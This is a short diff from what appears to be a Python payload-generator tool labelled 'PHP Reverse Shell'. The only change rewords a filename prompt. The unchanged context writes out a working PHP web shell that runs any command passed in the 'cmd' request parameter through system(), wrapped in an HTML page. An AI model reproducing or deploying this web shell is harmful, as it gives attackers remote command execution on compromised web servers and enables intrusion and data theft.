@@ -619,7 +619,7 @@ yddy   # PHP Reverse Shell #   :ddd-
      def php_option():
        Payload_Type_PHP = input(Fore.BLUE+"[+] Choose the Payload Type: ")
        if Payload_Type_PHP == "1":
-        File = input("[+] Enter the name of the reverse shell you want: ")
+        File = input("[+] Enter the path for the payload: ")
         f = open(File, "w+")
         S0 = "<html><body><h1><pre>Th3Reverser<br><br><?php if(isset($_REQUEST['cmd'])){$cmd = ($_REQUEST['cmd']);system($cmd);} __halt_compiler();?></pre></h1></body></html>"
         f.write('{0}'.format(S0))
